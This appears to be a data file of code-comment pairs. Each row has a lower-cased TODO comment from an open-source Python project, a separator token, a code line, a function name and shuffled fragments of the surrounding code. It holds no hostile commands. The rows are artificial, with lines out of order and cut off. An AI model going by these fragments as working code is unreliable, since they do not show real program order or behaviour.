# todo: to be removed in v2.8.0 </s> if not app_settings.use_backend_specific_templates:	get_sub_menu_template template_name = self._option_vals.sub_menu_template_name or \ self.sub_menu_template_name engine = self.get_template_engine() if template_name:
'location_type': loc.location_type.name,  # todo: remove when types aren't optional </s> 'uuid': loc.location_id,	loc_to_json return { 'name': loc.name, 'is_archived': loc.is_archived,
# todo: implement this </s> class opts(object):	Opts def __init__(s): s.format_map = self.FORMATS
# todo : uncomment these out to set default to densejacobian, once we have resolved further </s> self._inst_functs = {name: getattr(self, name, none) for name in _inst_functs}	__init__ super(ImplicitComponent, self).__init__(**kwargs)
# todo(tr3buchet) - remove comment in multi-nic </s> vm_opaque_ref = self._get_vm_opaque_ref(instance.id)	inject_network_info Generate the network info and make calls to place it into the xenstore and the xenstore param list logging.debug(_("injecting network info to xenstore for vm: |%s|"), vm_opaque_ref)
# todo: deprecated - remove in version 0.10 </s> if isinstance(training_trackers, string_types):	train "Pass appropriate featurizer " "directly to the policy instead.") logger.warn("Passing a file name to `agent.train(...)` is " "deprecated. Rather load the data with "
# todo: reduce_mean? </s> q_func_loss = tf.negative(td_errors) # * weights)	_train_body with tf.GradientTape() as tape: td_errors = self._compute_td_error_body(states, actions, next_states, rewards, done) q_func_grad = tape.gradient(q_func_loss, self.q_func.trainable_variables) self.q_func_optimizer.apply_gradients(zip(q_func_grad, self.q_func.trainable_variables))
pass  # todo </s> def set_default(self):	set_default
# todo: finish </s> pass	loadCodeSignature def loadCodeSignature(self):
# todo: remove this - cura-4482 </s> else:	_determineQualityAndQualityChangesForQualityChanges if quality_changes_list: quality_changes = quality_changes_list[0] quality_changes = global_quality_changes if not quality_changes:
# todo(user): keepalive is not enabled on the netperf control socket. </s> if vm.is_rebootable:	_Install '&& chmod +x find_max_burst.sh' % (NETPERF_EXAMPLE_DIR)) vm.ApplySysctlPersistent({ 'net.ipv4.tcp_keepalive_time': 60,
# todo: this is not handling decoding errors all that well. </s> if str is not unicode and type(imported_module_name) is unicode:	ExpressionBuiltinImport imported_module_name = module_name.getCompileTimeConstant() if type(imported_module_name) in (str, unicode): imported_module_name = str(imported_module_name) self._attemptRecursion(
kwargs['application'] = application.objects.get(client_id=credentials['client_id'])  # todo: this should be cached one day </s> kwargs.update(credentials)	dispatch scopes, credentials = self.server.validate_authorization_request(uri, http_method, body, headers) kwargs['scopes'] = scopes self.oauth2_data = kwargs self.oauth2_data['user_id'] = request.user.id
# todo: add these lines back </s> return w_old	create_weights def create_weights(k_t, b_t, g_t, s_t, gamma_t, w_old, mem): Convenience function to be called from NTM fprop.
# todo: move this to sublime_lib; make it accept a point or a region. </s> def geteol(view, point):	getEOL return view.line(point).end()
x_vec = np.matrix(xs).t  # todo python3: fix np.matrix </s> a_b = lstsq(y_mtx, x_vec, rcond=-1)[0]	sigmoid_adjust zs = -np.log(1.0 / np.array(ys).T - 1.0) Y_mtx = np.matrix((np.ones(len(ys)), zs)).T  # TODO python3: fix np.matrix a = a_b.item(0) b = a_b.item(1)
# todo: add docs </s> def init_fn():	init_fn mean = 0. m2 = 0.
"""todo doc me""" </s> def stats(table):	stats
# todo:eliminate this </s> text_to_debug = "value: " + str(q.value('.lowlevel.pitch.mean')) + "\n"	query_dataset else: q.setValue(str(param), value) text_to_debug += "COEFFS: a:" + str(coeffs['.lowlevel.pitch.mean']['a'][0]) + " b:" + str(coeffs['.lowlevel.pitch.mean']['b'][0]) + "\n" logger.debug(text_to_debug)
# todo find out what is best used here! </s> 'preferred_dtype' : none}	get_meta_information 'is_deterministic': True, 'handles_sparse': True,
# todo: load state into here </s> current_chunk +	inner_mapper new_schedule.extend( [CallKernel(kernel_name=new_kernel_name)] + [ReturnFromKernel(kernel_name=new_kernel_name)]) current_chunk = []
# todo instead of 3*t, use log_sf </s> dur += sample_discrete(dur_distn.pmf(np.arange(dur+1,3*self.t)))	HSMMStatesPython else: if self.censoring: else: dur += 1
# todo: enhance this method to set a flag and alert an admin to review content since </s> for filename_in_archive in filenames_in_archive:	upload_tar tar.close() uploaded_file.close() if os.path.isfile( filename_in_archive ): ok, message = self.__check_file_content( filename_in_archive )
# todo: implement link-local handling in networkmanager backend and move this test into commontests() </s> self.assert_iface(self.dev_e_client, ['inet 169.254.'], ['inet6 fe80:'])	test_link_local_ipv4 self.generate_and_settle()
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
# todo: we should consider the probabilities of `task1 failure -> task2 failure` and </s> count_runs = collections.counter()	generate_failing_together_probabilities def generate_failing_together_probabilities(self, push_data): count_single_failures = collections.Counter() count_both_failures = collections.Counter()
# todo: does this import need to be delayed because </s> from pyomo.solvers.plugins.solvers.persistent_solver import \	solve exception_on_failure=True, io_options=None): PersistentSolver if self.instance is None:
for joint in annos:  # todo : speed up with affine transform </s> adjust_joint = []	pose_resize_shortestedge mask = cv2.copyMakeBorder(mask, ph, ph + mh, pw, pw + mw, cv2.BORDER_CONSTANT, value=1) adjust_joint_list = [] for point in joint: if point[0] < -100 or point[1] < -100:
# (todo) chagne the dgl link </s> if osp.isdir(self.folder) and (not osp.exists(osp.join(self.folder, f'release_v{self.version}.txt'))):	PCQM4Mv2Dataset self.version = 1 self.url = f'http://ogb-data.stanford.edu/data/lsc/pcqm4m-v2.zip' print('PCQM4Mv2 dataset has been updated.') if input('Will you update the dataset now? (y/N)\n').lower() == 'y':
# todo check </s> return self.mimetype	format @interfacedoc def format(self):
# todo: find better way to avoid entering "__hh_previous_frame" to avoid traceback added by `tracers.locationtracer` </s> if isinstance(value, traceback):	_enter included_attrs = [_ for _ in dir(value) if not _.endswith("__")] return dict(), [(_, getattr(value, _)) for _ in included_attrs] return dict(), [] return default_enter(path, key, value)
#todo: this variable plan_id is never used </s> plan_id = request.post['plan_id']	hourly_billing_report start_date.day, 23, 59, 59, 999999) if "plan_id" in request.POST: if "switch" in request.POST: switch_id = request.POST['switch']
# todo: get these values from the same place as setup.py </s> return appdirs.user_data_dir("ice", "scott rice")	application_data_directory def application_data_directory():
#todo: define tests which check db contents </s> test_gdf = gdf() # test default configuration	test_GDF_get_slices def test_GDF_get_slices(self): "Test GDF get_slices function" ndarray_dict = test_gdf.get_slices(self.TEST_2D_DIMENSION_RANGE_DICT) ndarray_dict = test_gdf.get_slices(self.TEST_2D_DIMENSION_RANGE_DICT, ndarray_type_tags=['LS5TM'])
# todo: remove in 1.3 </s> def test_kbinsdiscretizer_subsample_warn():	test_kbinsdiscretizer_subsample_warn X = np.random.rand(200001, 1).reshape(-1, 1) kbd = KBinsDiscretizer(n_bins=100, encode="ordinal", strategy="quantile")
return  # todo return placeholder "[error]" track? </s> if sp_track.availability != spotify.trackavailability.available:	to_track return  # TODO Return placeholder "[loading]" track? if sp_track.error != spotify.ErrorType.OK: return  # TODO Return placeholder "[unavailable]" track? return models.Track(
# todo: self.assertfalse(prop.is_valid(np.bool8(false))) </s> self.asserttrue(prop.is_valid(np.int8(0)))	test_Float try: import numpy as np self.assertTrue(prop.is_valid(np.int8(1))) self.assertTrue(prop.is_valid(np.int16(0)))
# todo is this serious enough to raise a canerror exception? </s> log.error('setting filters failed: %s, falling back to software filtering (not in kernel)', str(res))	set_filters if res != 0: self._is_filtered = False else: self._is_filtered = True
# @todo: deprecate </s> ireport_search = s3search(	S3IRSModel ), ] advanced=( S3SearchSimpleWidget(
# todo new message here </s> routing_key='sms.receipt.%s' % (self.transport_name)	delivery_report @inlineCallbacks def delivery_report(self, *args, **kwargs): message = Message(**{ 'transport_name': self.transport_name,
# todo: remove return </s> if true:	test_dense_to_brle def test_dense_to_brle(self): x = np.array([False] * 300 + [True] * 200 + [False] * 1000) return np.testing.assert_equal(rl.dense_to_brle(x),
# todo: if you try to fix this first read issue #958 and 1018 </s> align = createalignment(0,0,0,0)	_ensureReadForGameWidgets notebooks["statusbar"].set_border_width(4) hbox.pack_start(notebooks["statusbar"], False, True, 0) align.add(notebooks["messageArea"]) hbox.pack_start(align, True, True, 0)
# todo(nzw0301) support intloguniform </s> if isinstance(distribution, intloguniformdistribution):	_initialize_sigma0 sigma0s = [] for name, distribution in search_space.items(): raise NotImplementedError if isinstance(distribution, UniformDistribution):
# todo: add and store preprocessing errors. </s> logging.error('unable to decode username.')	_ParseFileData username = row[0].decode('utf-8') except UnicodeDecodeError: continue try:
#todo check max_amount on conversion?? </s> if self.total_sell_amount(our_offers) < self.min_amount:	update_otc_orders print(f"Failed to cancel offer #{offer.offer_id}!") our_offers = self.otc_offers(self.sell_token, self.buy_token) rate = self.apply_gap(conversion.rate, self.avg_gap) have_amount = self.max_amount - self.total_sell_amount(our_offers)
# todo(jflesch): check last_mod ! </s> print ("%s has been modified. reindexing ..." % doc.docid)	__update_doc_in_index def __update_doc_in_index(self, index_writer, doc): last_mod = datetime.datetime.fromtimestamp(doc.last_mod) docid = unicode(doc.docid) txt = u""
# todo: to be implemented </s> pass	handle_cli_command docstrings.update_readme_for_modules(cmd[2:]) elif cmd[:2] in (['modules', 'enable'], ['modules', 'disable']): else: print_stderr('Error: unknown command')
# todo test that citext.sql gets loaded with 9.0.x </s> psycopg2.connect().cursor().execute.side_effect = mocked_execute	test_setupdb_app_main_pg_90 with mock.patch(self.psycopg2_module_path) as psycopg2: app = setupdb_app.SocorroDB(config) psycopg2.connect().cursor().fetchall.side_effect = mocked_fetchall stderr = StringIO()
# todo: use bezier curve instead of polygon. perhaps aggdraw module. </s> draw.polygon(path, fill=1)	_draw_subpath int(knot.anchor[0] * height), ) for knot in subpath] del draw return mask
#todo_jay: put seed in job </s> jobs.append({"compiled_circuit": job["compiled_circuit"], "shots": job["shots"]})	run jobs = [] for job in self.__to_execute[backend]: if backend == "local_qasm_simulator": job_result = self.run_local_qasm_simulator(jobs)
# todo: remove after py2.5 deprecation </s> if sys.version_info[:2] > (2, 5):	test_tab_2226_tblastn_011 self.assertEqual('random_s00', qresult.id) self.assertEqual(0, len(qresult)) with warnings.catch_warnings(record=True) as w: warnings.simplefilter('always')
# todo: replace sdolenc with tducret after merge </s> url = "https://raw.githack.com/sdolenc/\	test_amazonscraper_404_url def test_amazonscraper_404_url(): amazon-scraper-python/urltests/test/404.html" with pytest.raises(Exception):
# todo if the other logging that is happening is less frontpage </s> self.pbars.pop(pid).finish()	emit self.pbars[pid] = pbar elif update is None: else: self.pbars[pid].update(
self.group_self(self._grouped_on)  # todo: think about removing </s> groups = []	__rshift__ return delayedFcn(otherDf) if self._group_dict: for group_vals, group_inds in self._group_dict.iteritems(): subsetDf = otherDf[group_inds]
if isinstance(err, asyncio.cancellederror):  # todo: remove when updated to 3.8 </s> raise err	BlobAnnouncer log.debug("failed to announce %s, could only find %d peers, retrying soon.", blob_hash[:8], peers) except Exception as err: log.warning("error announcing %s: %s", blob_hash[:8], str(err)) async def _announce(self, batch_size: typing.Optional[int] = 10):
# todo: signal the user </s> self.finish()	fetch if service not in self.application.service.remote_services or \ not self.application.service.remote_services[service].connected: return self.application.service.remote_services[service].get_file(
# pycryptodome does not expose the mode attribute </s> plaintext = "a" * 32	test_hmac_used_matches_selected_ciphersuite client_enc_cipher = sec_params.get_client_enc_cipher() client_dec_cipher = sec_params.get_client_dec_cipher() self.assertEqual(client_dec_cipher.decrypt(client_enc_cipher.encrypt(plaintext)), plaintext) client_hmac = sec_params.get_client_hmac()
# todo: what actually raises valueerror in the following code? </s> try:	S3ReadStream return '' def readline(self, *args, **kwargs): result = super(S3ReadStream, self).readline(*args, **kwargs) return result
# todo: test that valueerror is raised </s> validate.direction(direction)	reducible _from, to = mechanism, purview else: return utils.block_reducible(cm, _from, to)
# todo docs </s> return gbq_parse_data(schema, [])	get_pandas_df else:
# todo: command+c for mac </s> tk.messagebox.showerror("internal error. use ctrl+c to copy",	on_tk_exception sys.last_traceback = tb traceback.print_exception(exc, val, tb) traceback.format_exc())
# todo support intloguniformdistribution </s> else:	_initialize_sigma0 log_low = math.log(distribution.low) sigma0.append((log_high - log_low) / 6) raise NotImplementedError( "The distribution {} is not implemented.".format(distribution)
# todo complete this method </s> return none	vector_to_amplitudes_ee def vector_to_amplitudes_ee(vector, kshift, nkpts, nmo, nocc, kconserv):
# todo: move into toolevaluator test(s) </s> with self._prepared_wrapper() as wrapper:	test_prepare_sets_no_version_command def test_prepare_sets_no_version_command(self): assert wrapper.write_version_cmd is None
# todo(jamalex): could do md5 checks here instead, to be ultra-safe </s> if os.path.isfile(dest) and os.path.getsize(dest) == f.file_size:	handle_async srcpath = paths.get_content_storage_file_path(filename) dest = paths.get_content_storage_file_path(filename, datafolder=data_dir) overall_progress_update(f.file_size) continue
# todo(rbharath): can this be removed? </s> return labels	predict_on_batch labels = from_one_hot(np.squeeze(np.concatenate(labels)))
# todo(cmaloney): good exception catching, etc </s> def wsgi_app(env, start_response):	wsgi_app subscriber.handle_event(json.load(env['wsgi.input'])) start_response('200 OK', [('Content-Type', 'text/html')])
except (testtransactionfailed, validationerror, valueerror):  # todo: 1950 </s> if crash_on_failure:	batch_deposits deposited_stakers, receipt = allocator.deposit_next_batch(sender_address=self.deployer_address, gas_limit=gas_limit) raise message = "Failed allocations batch"
# todo! get destination path from user save dialog. </s> path = '/tmp/{name}.png'.format(name=layer.name)	export_sprite_sheet row = row + 1 flat_layer = pdb.gimp_image_merge_visible_layers(img2, 0) self.save_png(img2, path) pdb.gimp_image_delete(img2)
#todo: add support for network load balancer </s> self.tenancy = consts.script_ec2_tenancy_shared	Ec2PriceDimension self.albHours = int(kargs.get('albHours',0)) self.albLcus= int(kargs.get('albLcus',0)) self.validate() def validate(self):
el_movieposter.set('onselect', "atv.loadurl('"+el_path+"')")  # todo: 'select' - show metadata </s> el_movieposter.set('onplay', "atv.loadurl('"+el_path+"')")	XML_TVSeason el_moviePoster.set('id', 'shelf_item_'+str(aTV_shelf_item)) aTV_shelf_item += 1 el = etree.SubElement(el_moviePoster, 'label') el.text = i.get('title')
#todo: check for continous or discrete, only continuous supported right now </s> dico = 'c'	hinfsyn gam : infinity norm of closed loop system info : info returned from siycot routine try: from slycot import sb10ad
#todo(#212): use a map construct instead of unrolling. </s> rhs = batching.move_dim_to_front(rhs, rhs_bdim)	conv_general_dilated_batch_rule return outputs, 0 elif rhs_bdim is not None: outputs = [ conv_general_dilated(lhs, x, window_strides, padding,
#todo: namespaces too hardwired, clean-up... </s> header = request('header', ns=soap_uri, )	preprocess def preprocess(self, client, request, method, args, kwargs, headers, soap_uri): k = 'wsse:Security' header.marshall(k, self.token, ns=False, add_children_ns=False)
'"ed25519_secret_seed", "pre_auth_tx", "sha256_hash"'.format(version_byte_name))  # todo </s> if version_byte != expected_version:	decode_check except KeyError: raise KeyError('{} is not a valid version byte name. expected one of "ed25519_public_key", ' raise Exception('Invalid version byte. Expected {}, got {}'.format( str(expected_version), str(version_byte)))
# todo: replace </s> tuple = np.reshape(a=triples[row_nmbr, start_of_columns_to_maintain:end_of_columns_to_maintain],	_compute_metrics start_of_columns_to_maintain, end_of_columns_to_maintain = column_to_maintain_offsets for row_nmbr, row in enumerate(triples): newshape=(1, 2)) tuples = np.repeat(a=tuple, repeats=all_entities.shape[0], axis=0)
# todo: uncomment when adding support for literal hex bytes </s> print(bytearray(b'hello world   ').islower())	test_islower print(bytearray(b'hello world').islower())
# todo: this is not using any cache... </s> data = pod.read_yaml(path, locale=locale)	func locale = str( doc._locale_kwarg or doc.collection.default_locale) return YamlLoader.deep_reference(reference, data) if doc:
# todo: limit/check colorcode </s> if colorcode is none:	LaunchpadPro number = min( number, 99 ) number = max( number, 0 ) colorcode = LaunchpadPro.COLORS['white'] self.midi.RawWrite( 144, number, colorcode )
# todo move to a proper logging framework </s> global debug	set_flags def set_flags(debug: bool, quiet: bool) -> None: global QUIET if debug:
# todo optimize: special case where there is only one dynamic </s> if abi_t.is_dynamic():	abi_encode abi_t = abi_type_of(o.typ) if parent_abi_t.is_complex_type(): lll_ret.append(["mstore", dst_loc, dyn_ofst]) child_dst = ["add", dst_begin, dyn_ofst]
# todo: remove anytime in 2016 </s> _assert(false, 'most granular filter was a surprising value ({}).'.format(	get_filtered_data_for_parsed_params return get_all_form_details(domain, deleted=deleted) else: parsed_params.most_granular_filter)) return get_all_form_details(domain)
# todo return, catch exception in main() </s> raise e	create_binja_script except Exception as e:
# todo: implement me </s> pass	_flag_for_human_review def _flag_for_human_review(version):
mock = create_mock_json('tests/resources/list_race_details.json')  # todo </s> mock_response.return_value = mock	test_list_incidents @mock.patch('betfairlightweight.endpoints.scores.Scores.request') def test_list_incidents(self, mock_response): mock_update_keys = mock.Mock() response = self.scores.list_incidents(mock_update_keys)
# todo 目前仅在 华泰子类 中实现 </s> start_date, end_date = helpers.get_30_date()	exchangebill 默认提供最近30天的交割单, 通常只能返回查询日期内最新的 90 天数据。 :return: return self.get_exchangebill(start_date, end_date)
codecs.decode('5050827d08000000d00745b2cf451b00', 'hex'),  # tcp random cmd_ack_ok todo: generate proper sequenced response </s> codecs.decode('5050827d10000000dc053b59d0983500f401ae4301000000f19449000000120c07130906', 'hex'), # tcp prepare_data 1011	test_tcp_live_connect codecs.decode('5050827d04020000dd05942c96631500f801000001000e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003830380000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003832310000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003833350000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003833310000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003833320000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003836000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000383432000000000000000000000000000000000000000000','hex'), #DATA directly(not ok) codecs.decode('5050827d08000000d00745b2cf451b00', 'hex'), # tcp random CMD_ACK_OK TODO: generate proper sequenced response codecs.decode('5050827df8030000f401ae4301000000f19449000000120c07130906', 'hex'), # reg_event! codecs.decode('5050827d08000000d007fcf701003200', 'hex'),  # tcp CMD_ACK_OK
# todo document </s> def _null_mip(subsystem):	_null_mip This is the MIP associated with a reducible subsystem.""" return BigMip(subsystem=subsystem,
#todo the tooltip should actually hide on its own. ticket #1096 </s> exit_cb = callback.chainedcallbacks(cb1, cb2)	init_widget cb1 = Callback(res_bar.close_construction_mode) cb2 = Callback(button.hide_tooltip) self.widget.mapEvents({ button.name + '/mouseEntered': enter_cb,
# todo: check the values from the related manager </s> pass	add_object for i in self.data: if getattr(entry, i).__class__.__name__ == 'ManyRelatedManager': else: self.assertEqual(getattr(entry, i), self.data[i])
#todo(bcwaldon): use the schema to actually validate something </s> json.loads(response.text)	test_resource response = requests.get(path) self.assertEqual(response.status_code, 200) path = 'http://%s:%d%s' % ('0.0.0.0', self.api_port, links['access']) response = requests.get(path)
pass # todo </s> def handle_request(self, input):	handle_request
# todo figure out something useful to do with the newbranch param </s> return super(hgrepo, self).pull(remote, heads, force)	pull else: #pragma: no cover
# todo: move to pytest.mark.parametrize once nose gone </s> @dec.skip_win32	test_arg_split def test_arg_split(): tests = [['hi', ['hi']],
# todo - get rid of these </s> self.value_boundaries = none #x_min, x_max, y_min, y_max	__init__ self.draw_mode = None self.max_hours = None self.x_factor, self.y_factor = None, None
#todo implement transformation for corner nodes </s> if 'quad8' in vecname:	data_in_material_coord new_vector.data[:, :, 6] = Qx_new new_vector.data[:, :, 7] = Qy_new for i in [1, 2, 3, 4]: new_vector.data[:, i, :] = 0
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: check output </s> def test_hierarchy_iprint2(self):	TestSolverPrint prob.setup(check=False) output = run_model(prob) prob = Problem() model = prob.model
# todo(b/138845899): consider use span instead of id. </s> latest_artifact = max(	_prepare_input_for_processing matched_artifacts.append(artifact) if matched_artifacts: matched_artifacts, key=lambda artifact: artifact.id) tf.logging.info('latest_artifact {}.'.format(latest_artifact))
# todo: check whether it's already installed?. see yum notes  yum list installed "$@" >/dev/null 2>&1 </s> self.send(' yum list installed ' + package + ' > /dev/null 2>&1',check_exit=false,loglevel=logging.debug)	package_installed return self.send_and_get_output(' dpkg -s ' + package + """ | grep '^Status: install ok installed' | wc -l""",loglevel=logging.DEBUG) == '1' elif self.current_environment.install_type == 'yum': return self.check_last_exit_values('install TODO change this',retbool=True) else:
# todo: @sbharadwajj implement and test </s> return true	hessian_is_zero def hessian_is_zero(self):
# todo: must be implemented </s> pass	get_range_selection def get_range_selection(self, chapter_count, volume_count):
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: ignoring repeat letters </s> target = targetnumber[0]	_copySingleMeasure if len(targetNumber) > 1: # this is an encoding error raise TranslateRomanTextException('a single measure cannot define a copy operation for multiple measures') for mPast in p.getElementsByClass('Measure'): if mPast.number == target:
# todo(dcramer): remove in 7.6.x </s> project_id = filters.get('project_id')	record_group_tag_count if not created: return if not project_id: project_id = filters['project'].id
# todo: this is all just debugging stuff and can be removed </s> if false:	_GaussianTemplate self.phi = phih self.g = self.g + dg uh = [ui.copy() for ui in uh] gh = self.g.copy()
# todo: improve this. </s> sentence_start = view.find_by_class(s.b,	get_text_object_region return w if type_ == SENTENCE: forward=False, classes=sublime.CLASS_EMPTY_LINE)
# todo in python 2.7 or later, this should be </s> exclude = set(get_column_name(column) for column in exclude)	__init__ only |= set(['type', 'id']) if exclude is not None: self.default_fields = only self.exclude = exclude
pass                # todo(nnorwitz): impl </s> elif isinstance(token, ast.union):	_ProcessTypedef pass                # TODO(nnorwitz): impl
# todo(dspasovski): fix this. </s> raise skiptest	TestIndexSearch eq_(r.status_code, 200) def test_sorter(self): r = self.client.get(self.url) li = pq(r.content)('#sorter li:eq(0)')
# todo users aren't going to match </s> assert len(django_ids) == len(django_objects) == len(page_of_modm_objects), 'lost some keys along the way for {}'.format(django_model._meta.model.__name__)	validate_model_data django_ids = [self.get_pk(modm_obj) for modm_obj in page_of_modm_objects] django_objects = django_model.objects.filter(id__in=django_ids) for modm_obj in page_of_modm_objects: django_obj = django_objects.get(pk=self.get_pk(modm_obj))
transparent = false  # todo </s> width, height = utils.calc_filmsize(context.scene, context)	_init_framebuffer def _init_framebuffer(self, context): self.framebuffer = FrameBuffer(transparent, width, height)
# todo: check the data! </s> self.asserttrue(len(list(pipe)) > 0)	test_feeddiscovery pipe_def = self._get_pipe_def(pipe_file) pipe = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def)
# todo: test me </s> if get_django_features()['caches_singleton']:	get_cache def get_cache(alias): from django.core.cache import caches return caches[alias]
pass # todo: explain </s> pass	status402 def status402(self):        # Payment Required
# todo: the following should be handled within inputspecs ? </s> self.inputspecs.load_entries()	update_all logger.debug("updateAll called by %s", sender_name) self.inputSpecs.color_design_button("ok") self.inputInfo.load_entries() self.inputCoeffs.load_entries()
# todo(jblespiau): we can simply use buf.xla_shape() when version 0.1.58 is </s> _check_infs(prim.name, getattr(buf, "xla_shape", buf.shape)(), buf)	check_infs def check_infs(prim, bufs): for buf in bufs:
# todo check </s> return self.mimetype.split('/')[-1]	encoding @interfacedoc def encoding(self):
pass # todo </s> def handle_request(self, input):	handle_request
_imdb_queue['quality'] = 'dvd' # todo: get defaul from config somehow? </s> else:	optik_imdb_queue _imdb_queue['quality'] = parser.rargs[2]
# todo: manage other values </s> if marker_node.get("meetorslice") == "slice":	_marker translate_y = -size(marker_node.get("refY")) if marker_node.get("preserveAspectRatio", "xMidYMid"): scale_value = max(scale_x, scale_y) else:
# todo: order of attributes is not assured; allow for any order. </s> match1 = '<words default-y="45.0" font-weight="bold" justify="left">fast</words>'	testExportMetronomeMarksD p.repeatAppend(note.Note('g#3'), 8) p.insert(0, tempo.MetronomeMark(number=132)) match2 = '<per-minute>132</per-minute>' raw = fromMusic21Object(p)
# todo differentiate integer and float? using custom renderers and </s> return {	_get_cell_type def _get_cell_type(dt): 'b': 'checkbox', 'i': 'numeric',
self.assertequal(out.strip(), "inactive") # todo real "failed" </s> logg.info("== 'start' will have a later failing service remaining but failed")	test_4090_simple_service_RemainAfterExit logg.info(" %s =>%s \n%s", cmd, end, out) self.assertEqual(end, 3) cmd = "{systemctl} start zzx.service {vv}" out, end = output2(cmd.format(**locals()))
return none # xxx todo return accordingly generated command for initiating this proxy </s> proxyconfig = self.__proxies[name]["config"]	getProxyConfig raise ConfigFileException("No such proxy method defined.")
# todo: handle 2d and 3d data </s> pupil_data = self.g_pool.pupil_positions[eye_id, "3d"]	_pupil_getter def _pupil_getter(): try: closest_pupil_idx = pm.find_closest( pupil_data.data_ts, self.current_frame_ts
# todo(ls): revert this loop to "yield from" </s> for __x in self.__cause__.format(chain=chain): yield __x	format if chain: if self.__cause__ is not None: yield _cause_message elif (self.__context__ is not None and
pass # todo </s> draw()	event_loop reshape(event.xconfigure.width, event.xconfigure.height) elif event.type == xlib.KeyPress: glXSwapBuffers(dpy, win)
# todo remove me </s> import yaml	parseSDFMaterial else: log("       Color not defined: {}.".format(color), 'DEBUG') print(yaml.dump(materialdict)) return materialdict
#todo: check if/where this is used; if not used externally - remove </s> self.marker_detector.robust_detection = value	robust_detection @robust_detection.setter def robust_detection(self, value: bool):
# todo(vish): move this into the driver layer </s> logging.debug("getting console output for %s", (instance_id))	get_console_output @exception.wrap_exception def get_console_output(self, context, instance_id): instance_ref = db.instance_get(context, instance_id) if FLAGS.connection_type == 'libvirt':
# todo: constants file for "broadcast" </s> pub_sock.send('broadcast', flags=zmq.sndmore)	Publisher pub_sock.send(payload) else: pub_sock.send(payload) else:
# todo change to native framework call, when plex allows token in header </s> opener = urllib2.build_opener(urllib2.httphandler)	GETVIEWSTATE unwatchedXML = XML.ElementFromURL(fetchUrl) else: request = urllib2.Request(fetchUrl) request.add_header(
# todo remove after unified backends </s> if get_backend() == "pytorch":	test_learning_cartpole ) agent_config = config_from_path("configs/apex_agent_cartpole.json") agent_config["memory_spec"]["type"] = "mem_prioritized_replay" executor = ApexExecutor(
# test_qnetwork_weight_quantization: todo </s> assert all_weights.size == all_weights_signature.size	test_bidirectional_wrapper all_weights.append(w) all_weights = np.array(all_weights) assert np.all(all_weights == all_weights_signature) inputs = 2 * np.random.rand(10, 2, 4)
# todo: make grouper in query </s> grouper = grouper(dimension='time',	get_dataset resolution = query.resolution or get_resolution(observations) geobox = GeoBox.from_geopolygon(geopolygon, resolution) group_by=lambda ds: ds.center_time, units='seconds since 1970-01-01 00:00:00')
# todo: replace with "yield from" when dropping python 2. </s> for stream in self._parse_live_streams(channel):	_get_live_streams res = ajax(CHINFO_URL, cookies=cookies, data=params) channel = http.json(res, schema=_channel_schema) yield stream
# todo: it would be nice to be async about this. set 1 second timeout. </s> try:	dot_versioncheck 'version': bayeslite.__version__ } r = requests.post(SERVICE, data=payload, timeout=1) if r.status_code == 200 and r.json.result != "current":
# todo(dspasovski): fix this. </s> raise skiptest	test_page def test_page(self): r = self.client.get(self.url) eq_(r.status_code, 200)
# todo: make this a hard error, instead of a silent overwrite </s> logging.warning("kvm: overriding disk_cache setting '%s' with 'none'"	_GenerateKVMRuntime if instance.disk_template in constants.DTS_EXT_MIRROR: if disk_cache != "none": " to prevent shared storage corruption on migration", disk_cache)
# todo: don't rely on the touch command </s> phlsys_subprocess.run("touch", args.try_touch_path)	run_once if args.try_touch_path: try: except Exception: pass  # XXX: we don't care atm, later log this
raise notimplementederror  # todo </s> def __init__(self, perturbation_function, steps, recompute_analysis=false):	__init__
# todo: look this up in one query </s> for user_id in collaborator_ids:	update_playlist collaborator_ids = collaborator_ids.get(playlist.id, []) collaborators = [] user = db_user.get(user_id) if user:
# todo: change template so it iterates through form and not formfields </s> context['form_fields'] = context['form']	get_context_data context = super(FeedbackClass, self).get_context_data(**kwargs) context['title'] = _('Feedback') context['form_action'] = reverse('core:feedback') context['submit_text'] = _('Send')
# todo complete this method </s> return amplitudes_to_vector_ee(r1, r2, kshift, kconserv)	amplitudes_to_vector def amplitudes_to_vector(self, r1, r2, kshift, kconserv=None):
# todo(sbauza): the current placement noauthmiddleware returns a 401 </s> return self._client.get(	_fake_get def _fake_get(self, *args): (url,) = args[1:] url, endpoint_override="http://127.0.0.1:%s" % self.service.port,
# todo: chunk transmissions into more managable lenths </s> chunk = transmissions.filter(q).values_list('pk', flat=true)	backend_preparation for backend_id in backends.distinct(): q = Q(connection__backend_id=backend_id) send_transmissions.delay(backend_id=backend_id, message_id=dbm.pk,
# todo: verify exception type once those exists </s> dotfile(name, target).add()	test_add for x in range(2, times): with pytest.raises(OSError): assert target.check(file=1, link=0) assert name.check(file=1, link=1)
# todo assert cls.__tablename__ == '' </s> with dbcleanup(session, cls):	test_HistoryDatasetAssociationTagAssociation model, session, history_dataset_association, tag, user): cls = model.HistoryDatasetAssociationTagAssociation user_tname, value, user_value = 'a', 'b', 'c' obj = cls(user=user, tag_id=tag.id, user_tname=user_tname, value=value)
# todo executor, max_workers </s> to_parquet(chunk, conn, bucket, key_prefix,	to_sql else: for chunk in get_chunks(df, chunksize): compression=compression, flavor=flavor)
# todo - use new error message api! ts </s> self.showerrormessage(m.message(str(mymessage)))	accept except (KeywordDbError, Exception), e: myMessage = getExceptionWithStacktrace(e, theHtml=True) self.hideBusy() return
# todo: fix comment for this and simplifier </s> print(data)	_detail_pointer_tensor Usage: ptr = _detail_pointer_tensor(data) return PointerTensor( id=data[0],
